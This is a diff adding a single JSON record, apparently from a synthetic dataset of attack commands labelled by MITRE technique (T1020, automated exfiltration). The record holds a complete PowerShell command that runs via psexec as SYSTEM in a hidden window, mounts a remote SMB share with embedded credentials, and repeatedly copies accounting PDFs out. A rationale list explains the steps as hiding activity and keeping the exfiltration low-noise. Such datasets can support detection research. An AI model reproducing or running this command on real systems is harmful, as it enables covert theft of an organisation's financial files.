@@ -1,0 +1,24 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "psexec -accepteula -s -d powershell -NoProfile -WindowStyle Hidden -Command \"$ProgressPreference='SilentlyContinue'; cmd.exe /c 'net use \\\\203.0.113.99\\share /user:svc_user P@ssw0rd /persistent:yes' >$null 2>&1; $sent='C:\\ProgramData\\.sent'; New-Item -ItemType Directory -Path $sent -Force | Out-Null; while ($true){ Get-ChildItem 'C:\\Accounting' -Filter *.pdf -Recurse -File | ForEach-Object { Copy-Item -Path $_.FullName -Destination '\\\\203.0.113.99\\share' -Force -ErrorAction SilentlyContinue; if ($?) { Move-Item -Force $_.FullName (Join-Path $sent $_.Name) } }; Start-Sleep 600 }\"",
+  "explanation": "Mounts an external SMB share with credentials and continuously copies targeted PDFs to it, moving files after transfer to avoid duplicates.",
+  "rationale_steps": [
+    "Use PSExec to execute as SYSTEM and hide activity.",
+    "Persistently map an SMB share using provided credentials.",
+    "Recursively copy accounting PDFs to the remote share.",
+    "Move items to a sent folder upon successful copy to prevent re-sends.",
+    "Loop with delays for automated, low-noise exfiltration."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-8bc12c8e-a75c2fbe",
+  "source_prompt_hash": "8bc12c8e",
+  "timestamp_utc": "2025-09-30T08:56:54.215628Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
